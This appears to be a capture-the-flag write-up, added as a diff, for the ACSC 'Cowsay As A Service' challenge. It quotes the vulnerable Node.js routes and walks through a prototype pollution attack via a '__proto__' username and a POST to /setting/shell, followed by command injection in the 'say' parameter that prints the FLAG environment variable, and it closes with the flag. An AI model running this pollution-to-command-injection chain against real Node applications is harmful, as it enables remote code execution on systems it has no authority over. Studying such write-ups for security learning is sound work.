@@ -1,0 +1,73 @@
+<hr />
+
+<h2>description: Prototype pollution leads to RCE</h2>
+
+<h1>Cowsay As A Service</h1>
+
+<h2>Description</h2>
+
+<p>Enjoy your cowsay life with our Cowsay as a Service!\
+You can spawn your private instance from https://cowsay-as-a-service.chal.acsc.asia/.\
+\
+Notice: Please do not spawn too many instances since our server resource is limited.\
+You can check the source code and run it in your local machine before do that.\
+Each instances are alive only for 5 minutes.\
+But don't worry! You can spawn again even if your instance expired.\</p>
+
+<p><code>https://cowsay-as-a-service.chal.acsc.asia/</code></p>
+
+<p>{% file src="../../.gitbook/assets/cowsay-as-a-service.tar.gz_b1f19fe170867369eb5297d2b9d4cc29.gz" %}
+Challenge Files
+{% endfile %}</p>
+
+<h2>Solution</h2>
+
+<p>The <code>/usr/games/cowsay</code> game is run from <code>child_process.spawnSync</code>.</p>
+
+<p>```javascript
+router.get('/cowsay', (ctx, next) =&gt; {
+  const setting = settings[ctx.state.user];
+  const color = setting?.color || '#000000';</p>
+
+<p>let cowsay = '';
+  if (ctx.request.query.say) {
+    const result = child_process.spawnSync('/usr/games/cowsay', [ctx.request.query.say], { timeout: 500 });
+    cowsay = result.stdout.toString();
+  }
+```</p>
+
+<p>The settings endpoint sets the settings for <code>ctx.state.user</code>, which is also equal to the <code>username</code> cookie. The setting name is also user-controlled.</p>
+
+<p><code>javascript
+router.post('/setting/:name', (ctx, next) =&gt; {
+  if (!settings[ctx.state.user]) {
+    settings[ctx.state.user] = {};
+  }
+  const setting = settings[ctx.state.user];
+  setting[ctx.params.name] = ctx.request.body.value;
+  ctx.redirect('/cowsay');
+});
+</code></p>
+
+<p>This allows us to perform prototype pollution. I used <code>__proto__</code> as the username, which will set settings for <code>{}.__proto__</code>. Then, we can use <code>shell</code> as the setting name to set <code>shell=true</code> for all objects.</p>
+
+<p>```http
+POST /setting/shell HTTP/1.1
+Host: localhost:3000</p>
+
+<p>...</p>
+
+<p>{
+    "value": true
+}
+```</p>
+
+<p>This makes the command run within a shell, allowing us to perform command injection:</p>
+
+<p><code>http://cowsay-nodes.chal.acsc.asia:64280/cowsay?say=test;echo%20$FLAG</code></p>
+
+<p>This will output the <code>FLAG</code> environment variable.</p>
+
+<p><img src="../../.gitbook/assets/813db7ee6ba24656a515c09f5a719ebc.png" alt="" /></p>
+
+<p><code>ACSC{(oo)&lt;Moooooooo_B09DRWWCSX!}</code></p>
